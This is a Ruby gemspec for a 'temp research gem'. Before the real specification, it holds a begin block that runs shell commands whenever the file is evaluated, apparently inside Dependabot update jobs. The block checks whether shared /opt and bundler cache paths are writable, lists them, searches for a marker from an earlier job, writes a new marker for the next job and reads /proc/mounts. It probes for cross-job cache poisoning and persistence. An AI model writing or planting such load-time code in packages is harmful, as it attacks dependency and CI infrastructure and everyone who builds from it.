begin
  puts "==CACHEPOISON=="
  puts "--- writable check ---"
  puts `test -w /opt && echo "OPT_WRITABLE" || echo "opt not writable"`
  puts `test -w /opt/bundler/v2/.bundle && echo "GEMHOME_WRITABLE" || echo "gemhome not writable"`
  puts "--- opt contents ---"
  puts `ls -la /opt 2>&1`
  puts `ls -la /opt/bundler/v2/.bundle 2>&1 | head -30`
  puts "--- look for our OWN marker from a prior run (persistence check) ---"
  puts `cat /opt/bundler/v2/.bundle/CROSSJOB_MARKER_a8f3e2 2>&1`
  puts `find / -maxdepth 4 -name "CROSSJOB_MARKER_a8f3e2" 2>/dev/null`
  puts "--- write a new marker for the NEXT job to check ---"
  puts `echo "written_by_job=$DEPENDABOT_JOB_ID at $(date -u)" > /opt/bundler/v2/.bundle/CROSSJOB_MARKER_a8f3e2 2>&1; echo "write_exit=$?"`
  puts `cat /opt/bundler/v2/.bundle/CROSSJOB_MARKER_a8f3e2 2>&1`
  puts "--- other candidate shared paths ---"
  puts `test -w /opt/bundler && echo "OPT_BUNDLER_WRITABLE" || echo "no"`
  puts `df -h /opt 2>&1`
  puts `cat /proc/mounts 2>&1 | grep -i opt`
  puts "==CACHEPOISON_DONE=="
rescue => e
  warn "fingerprint error: #{e}"
end

Gem::Specification.new do |s|
  s.name        = "mygem"
  s.version     = "0.0.16"
  s.summary     = "temp research gem"
  s.authors     = ["researcher"]
  s.files       = ["lib/mygem.rb"]
  s.require_paths = ["lib"]
end
